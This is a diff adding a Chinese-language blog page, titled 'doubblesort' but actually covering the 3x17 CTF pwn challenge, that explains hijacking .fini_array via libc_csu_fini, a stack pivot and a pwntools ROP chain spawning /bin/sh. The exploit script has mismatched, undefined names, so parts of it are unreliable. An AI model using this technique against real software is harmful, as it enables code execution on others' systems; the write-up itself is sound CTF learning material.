@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+
+  <title>pwnable - doubblesort | Rin</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="Rin">
+    <meta name="author" content="Rin777">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="Rin" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
+<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            
+        	<li>
+        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
+            	<ul class="sb-submenu">
+				  	
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(6)</small></a></li>
+				    
+				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Generalization/" class="animsition-link">Generalization<small>(5)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-ChunkOverlapping/" class="animsition-link">HEAP - ChunkOverlapping<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Fastbin-Attack/" class="animsition-link">HEAP - Fastbin Attack<small>(10)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Heap-overflow/" class="animsition-link">HEAP - Heap overflow<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-House-Of-Force/" class="animsition-link">HEAP - House Of Force<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-House-Of-Orange/" class="animsition-link">HEAP - House Of Orange<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Off-By-One/" class="animsition-link">HEAP - Off By One<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Seccomp/" class="animsition-link">HEAP - Seccomp<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Tcache/" class="animsition-link">HEAP - Tcache<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Unlink/" class="animsition-link">HEAP - Unlink<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/HEAP-Unsortedbin/" class="animsition-link">HEAP - Unsortedbin<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(16)</small></a></li>
+				    
+				    <li><a href="/categories/OTHER-IO-FILE/" class="animsition-link">OTHER - IO FILE<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/PWN-COLLEGE/" class="animsition-link">PWN.COLLEGE<small>(11)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ARRAY-OUT-OF-BOUNDS/" class="animsition-link">STACK - ARRAY OUT OF BOUNDS<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-DynELF/" class="animsition-link">STACK - DynELF<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Format/" class="animsition-link">STACK - Format<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-OTHERS/" class="animsition-link">STACK - OTHERS<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Other/" class="animsition-link">STACK - Other<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ROP/" class="animsition-link">STACK - ROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-SROP/" class="animsition-link">STACK - SROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Stack-Overflow/" class="animsition-link">STACK - Stack Overflow<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2dlreslove/" class="animsition-link">STACK - ret2dlreslove<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2dlresolve/" class="animsition-link">STACK - ret2dlresolve<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2shellcode/" class="animsition-link">STACK - ret2shellcode<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-sandbox/" class="animsition-link">STACK - sandbox<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACk-OTHERS/" class="animsition-link">STACk - OTHERS<small>(1)</small></a></li>
+				    
+				</ul>
+        	</li>
+			
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://weibo.com/u/1682818607" class="animsition-link">没有营养的推广页</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="http://www.2323bb.ltd" class="animsition-link">cc_sakura</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36995313" class="animsition-link">F@LLe0</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://yyz9.cn" class="animsition-link">YYZ</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://www.star123.top" class="animsition-link">star</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="javascript:;" class="popup-trigger" title="Search"><span class="search-icon"></span>Search</a></li>
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0282.jpg" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">Rin</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            
+                            
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2022-04-27T03:44:23.414Z" itemprop="datePublished">
+          2022-04-27
+      </time>
+    
+    
+    | 
+    <a href='/tags/pwnable/'>pwnable</a>
+    
+    
+</span>
+                <h1>pwnable - doubblesort</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		
+    <div id="aplayer-wrwhdtxk" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
+
+
+
+
+
+<h1><span id="overview">overview</span></h1><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8A%E5%8D%8811.44.59.png" alt="截屏2022-04-27 上午11.44.59"></p>
+<p>​        轻松快乐的栈题，没有canary和pie那估计就是rop力。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8A%E5%8D%8811.48.26.png" alt="截屏2022-04-27 上午11.48.26"></p>
+<p>​        怪耶。</p>
+<p>​        居然是静态链接捏，那就不是ret2libc力。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8B%E5%8D%882.24.17.png" alt="截屏2022-04-27 下午2.24.17"></p>
+<h1><span id="reverse">Reverse</span></h1><p>​    开幕雷击</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-27%20%E4%B8%8B%E5%8D%881.45.04.png" alt="截屏2022-04-27 下午1.45.04"></p>
+<p>​    这是啥？</p>
+<p>​    秉持着看不懂就假装没有看到的原则，先看看得懂的地方。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">result = ++::result;</span><br><span class="line"><span class="keyword">if</span> ( ::result == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  my_write(<span class="number">1u</span>, <span class="string">&quot;addr:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">  my_scanf(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  addr = mem_set(buf);<span class="comment">//不知道这是个什么函数，暂且叫做mem set。</span></span><br><span class="line">  my_write(<span class="number">1u</span>, <span class="string">&quot;data:&quot;</span>, <span class="number">5uLL</span>);</span><br><span class="line">  my_scanf(<span class="number">0</span>, addr, <span class="number">0x18</span>uLL);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        可以看到程序提供了一个任意地址写。一次最多写24字节，并且正常情况下只能写一次。所以其实其他的那些恶心的伪代码暂时可以忽略掉了，这里一个任意地址写就已经足够了。</p>
+<p>​        突然意识到其实这个就是main函数，因为之前那个调用了非常多参数的函数其实是start函数。一般来说题目都会提供符号表，所以以前做题就直接点进main函数从而忽略start函数的其他参数了，以至于这里去除掉符号表后一下没有反应过来，看完了逻辑才后知后觉这里就是main函数。</p>
+<p>​        ps：对于没有符号表的动态链接程序，需要判断函数我一般是直接动调对比，但是如果是静态链接的话似乎也没有什么用，这里学到一种新的方式，就是利用flirt功能，但是十分可惜先进的ida7.7并没有安装这个插件。关于flirt，可以看看这个<a target="_blank" rel="noopener" href="https://hex-rays.com/products/ida/tech/flirt/in_depth/%E3%80%82%E8%BF%99%E7%AF%87guide%EF%BC%9F%E4%BB%8Eflirt%E7%9A%84%E6%9E%84%E6%80%9D%E5%88%B0%E5%AE%9E%E7%8E%B0%EF%BC%8C%E9%9D%9E%E5%B8%B8%E7%BB%86%E8%87%B4%E5%9C%B0%E5%90%91%E6%88%91%E4%BB%AC%E4%BB%8B%E7%BB%8D%E4%BA%86flirt%E8%BF%99%E4%B8%AA%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%84%9F%E8%A7%89%E9%83%BD%E5%8F%AF%E4%BB%A5%E6%8B%BF%E5%8E%BB%E5%8F%82%E5%8A%A0%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E6%BC%94%E8%AE%B2%E4%BA%86%EF%BC%8C%E5%8F%8D%E6%AD%A3%E6%88%91%E6%98%AF%E6%8A%B1%E7%9D%80%E5%A5%BD%E7%8E%A9%E7%9A%84%E5%BF%83%E6%80%9D%E7%9C%8B%E5%AE%8C%E4%BA%86%EF%BC%8C%E5%BD%93%E9%98%85%E8%AF%BB%E7%BB%83%E4%B9%A0%E4%BA%86%EF%BC%8C%E8%AF%9D%E8%AF%B4%E5%A6%82%E6%9E%9C%E6%98%AF%E6%AF%8D%E8%AF%AD%E7%9A%84%E8%AF%9D%E8%BF%99%E4%B8%AA%E4%BD%93%E9%87%8F%E8%AE%A4%E7%9C%9F%E7%9C%8B%E5%B9%B6%E7%90%86%E8%A7%A3%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%8D%81%E5%88%86%E9%92%9F%E5%90%A7%E3%80%82%E4%BD%86%E6%98%AFEnglish%E8%A6%81%E7%9C%8B%E4%BA%8C%E5%8D%81%E5%A4%9A%E5%88%86%E9%92%9F%E6%8D%8F%E3%80%82">https://hex-rays.com/products/ida/tech/flirt/in_depth/。这篇guide？从flirt的构思到实现，非常细致地向我们介绍了flirt这个功能，感觉都可以拿去参加技术分享演讲了，反正我是抱着好玩的心思看完了，当阅读练习了，话说如果是母语的话这个体量认真看并理解也就是十分钟吧。但是English要看二十多分钟捏。</a></p>
+<blockquote>
+<p>​        </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A signature file contains patterns of standard runtime functions. </span><br><span class="line">With their help, IDA is able to recognize the standard functions and names them accordingly.</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>​        如果有了sig文件，ida就能识别每个函数的名字。</p>
+<h1><span id="还是杂乱无章的做题笔记">还是杂乱无章的做题笔记</span></h1><p>​        想到哪写哪捏。</p>
+<p>​        任意地址写，很多时候想到的都是覆盖got表或者hook，栈题hook用得比较少，那就可以覆盖got，再不济可以覆盖栈中的返回地址为后门地址。</p>
+<p>​        跳转getshell的部分其实比较简单，但是如何leak后门地址呢？并且这里任意地址地址写应该只能利用一次。一次只能写0x18个字节，很显然仅靠这一次任意地址写我们啥都做不了。</p>
+<p>​        但是感觉也没有特别好的方法能够多次写入，于是到这里就没有思路了。</p>
+<p>​        所以我去看了wp，又学到了新知识。</p>
+<p>​        ps:我在看wp的时候发现有个师傅废话比我还多，有一点欣慰（bushi</p>
+<p>​        太长不看：在64位静态链接的程序下，<code>libc_csu_fini</code>会将程序接下来需要指行的函数保存在<code>.fini.array</code>数组，并且是逆序执行，比如先执行<code>.fini.array[1]</code>,再执行<code>.fini.array[0]</code>，这个<code>.fini.array</code>数组的地址是写可以比较容易获得并且可写的，所以如果我们能覆盖这个数组，就能够进行程序执行流劫持，甚至栈迁移。</p>
+<p>​        唔，这道题确实学到很多新知识，之前其实也有了解过main函数执行之前的一些操作，但是都是没有针对性地笼统了解，现在题目摆在我面前，不去深入了解就没有办法理解题目捏。</p>
+<p>​        所以这里参考了<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/226003.html">详解64位静态编译程序的fini_array劫持及ROP攻击</a></p>
+<p>​        反观我们开始的start函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_401EB0(main, v4, &amp;retaddr, csu_init, csu_fini, a3, &amp;v5);</span><br></pre></td></tr></table></figure>
+
+<p>​        大概就是这样。</p>
+<p>​        然后看csu fini</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8A%E5%8D%889.15.22.png" alt="截屏2022-04-28 上午9.15.22"></p>
+<p>​        这里比较关键的操作就是将<code>.fini_array</code>的地址保存在rbp中，然后在后面调用了<code>.fini_array</code>内保存的函数。</p>
+<p>​        可以利用elfheader直接查看</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8A%E5%8D%889.18.34.png" alt="截屏2022-04-28 上午9.18.34"></p>
+<p>​        可以看到确实0f0-100的范围内出现了两个函数指针。</p>
+<p>​                </p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8B%E5%8D%888.48.56.png" alt="截屏2022-04-28 下午8.48.56">    </p>
+<p>​        然后这里就是一个很逆天的操作，如果我们把    <code>.fini_array[1]</code>覆盖成某个我们想要跳转执行的函数A。然后<code>.fini_array[0]</code>覆盖为<code>libc_csu_fini</code>的地址，那么就会出现这样一种情况。</p>
+<p>​        当main函数第一次执行完，返回到start，调用<code>libc_csu_fini</code>，这个函数会执行<code>.fini_array[1]</code>，也就是我们刚刚覆盖的函数A。等待函数A执行完毕之后，返回到<code>libc_csu_fini</code>，然后继续调用<code>.fini_array[0]</code>，也就是<code>libc_csu_fini</code>。而这个函数又重新执行函数A，返回，再执行自己，以此周而复始，可以说如果<code>.fini_array[0]</code>一直是<code>libc_csu_fini</code>的地址，那么这个循环就会一直进行下去。</p>
+<p>​        所以只要我们把<code>.fini_array[0]</code>覆盖为<code>libc_csu_fini</code>的地址，并且把<code>.fini_array[1]</code>覆盖可以任意地址写的地址，就可以无限写入数据了，我们就正好可以写rop链。</p>
+<p>​        这个操作完成之后，就只需要考虑在哪里写入rop链了。我们要同时满足地址可写并且可执行，还需要劫持执行流到写入rop的地方，这里看起来非常简单，因为我们有一个非常无敌的任意地址写，但是实际上如果我们随便找某一个可写的地址写入rop链的话，栈指针将完全不能利用，rop也是无稽之谈，所以我们必须进行栈迁移，将栈劫持到写入rop的地方。</p>
+<p>​        关于如何利用<code>libc_csu_fini</code>实现栈迁移，其实也是有一定可讲的地方。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8B%E5%8D%889.31.23.png" alt="截屏2022-04-28 下午9.31.23"></p>
+<p>​        还是回到这一串汇编，这里fini为了调用fini array，将fini array的值保存在rbp中，因此我们可以通过控制fini array从而控制rbp，再借用leave ret一类的gadget进行栈迁移。</p>
+<p>​        这里就站在巨人的肩膀上，直接借用wp中的思路，将rop链写在array + 0x10上，然后劫持到fini上，就能直接执行rop链。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./3x17&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;111.200.241.244&quot;,62729)</span></span><br><span class="line"></span><br><span class="line">fini_addr = <span class="number">0x4B40F0</span></span><br><span class="line">main_addr = <span class="number">0x401B6D</span> </span><br><span class="line">start_addr = <span class="number">0x4B4100</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------rop-gadget-------</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line">pop_eax = <span class="number">0x41e4af</span></span><br><span class="line">pop_edi = <span class="number">0x401696</span></span><br><span class="line">pop_esi = <span class="number">0x406c30</span></span><br><span class="line">pop_edx = <span class="number">0x446e35</span></span><br><span class="line">syscall_addr = <span class="number">0x471db5</span></span><br><span class="line">binsh_addr = <span class="number">0x4B4600</span></span><br><span class="line">sys_read_addr = <span class="number">0x446E2C</span></span><br><span class="line">rop_addr = <span class="number">0x4b4100</span> <span class="comment">#fini array + 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_addr</span>(<span class="params">addr,data</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;addr:&quot;</span>)</span><br><span class="line">	p.send((sre(addr)))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#hajick the fini array to loop the write operation</span></span><br><span class="line"></span><br><span class="line">write_addr(fini_addr,libc_csu_fini)</span><br><span class="line">write_addr(fini_addr + <span class="number">0x8</span>,main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write rop chain in the fini + 0x10 </span></span><br><span class="line">write(bin_sh_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">write(rop_addr,p64(rop_pop_rax))</span><br><span class="line">write(rop_addr+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">write(rop_addr+<span class="number">16</span>,p64(rop_pop_rdi))</span><br><span class="line">write(rop_addr+<span class="number">24</span>,p64(bin_sh_addr))</span><br><span class="line">write(rop_addr+<span class="number">32</span>,p64(rop_pop_rdx))</span><br><span class="line">write(rop_addr+<span class="number">40</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(rop_addr+<span class="number">48</span>,p64(rop_pop_rsi))</span><br><span class="line">write(rop_addr+<span class="number">56</span>,p64(<span class="number">0</span>))</span><br><span class="line">write(rop_addr+<span class="number">64</span>,p64(rop_syscall))</span><br><span class="line">write(fini_array,p64(leave_ret)) <span class="comment"># overwrite the fini[0] to leave_ret addr to pivot the stack.when execute the leave ,rsp = rbp = fini array[0],then pop rbp,so the rsp is fini array[1],finally,ret with rip = rsp = fini array[2] = rop.</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>​        如果在write函数中不加<code>p.recv()</code>，interactive的时候就会被疯狂轰炸以至于拿不到flag。</p>
+<p>​        不加recv大概是这样。</p>
+<p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-28%20%E4%B8%8B%E5%8D%8810.13.37.png" alt="截屏2022-04-28 下午10.13.37"></p>
+<p>​        加上recv的话有时候会打不来，有时又可以。总之就是这个环境非常的离奇，如果本地打得通远端打不通建议多试几次。</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="../../24/week8_7.1_dubblesort/">
+        pwnable - doubblesort →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+<!-- Highlight.js -->
+
+<link rel="stylesheet"
+href="//highlightjs.org/static/demo/styles/atom-one-light.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
+</script>
+<script>
+hljs.initHighlightingOnLoad();
+
+</script>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By Rin777. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    
+                    
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+            <style>
+.local-search-popup {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  padding: 0;
+  background: rgba(255, 255, 255, .9);
+  color: #333;
+  z-index: 9999;
+  border-radius: 5px;
+  overflow: scroll;
+}
+#local-search-input {
+  width: 100%;
+  border: none;
+  outline: none;
+  border-bottom: 1px solid #151515;
+  background-color: initial;
+}
+.search-result-list {
+  list-style: none;
+  padding-left: 0;
+}
+.search-result-list > li {
+  margin-top: 15px;
+  border-bottom: 1px solid #ddd;
+  transition: all ease .3s;
+}
+.search-result-list > li:hover {
+  border-bottom: 1px solid gray;
+}
+.search-result-title {
+  font-size: 16px;
+}
+.search-result {
+  line-height: 20px;
+}
+.search-keyword {
+  font-weight: normal;
+  color: #c00;
+}
+
+@media (min-width: 890px) {
+  .popup-btn-close {
+    position: absolute;
+    top: 15px;
+    left: 35px;
+    border: 1px solid #151515;
+    padding: 0px 10px;
+    border-top-left-radius: 8px;
+    cursor: pointer;
+    transition: all ease .3s;
+  }
+  .popup-btn-close:hover {
+    background: #151515;
+    opacity: .9;
+    color: #fff;
+  }
+}
+@media (max-width: 890px) {
+  .popup-btn-close {
+    font-size: 0;
+    position: fixed;
+    right: 20px;
+    bottom: 50px;
+    width: 50px;
+    height: 50px;
+    background: #fff;
+    border-radius: 50%;
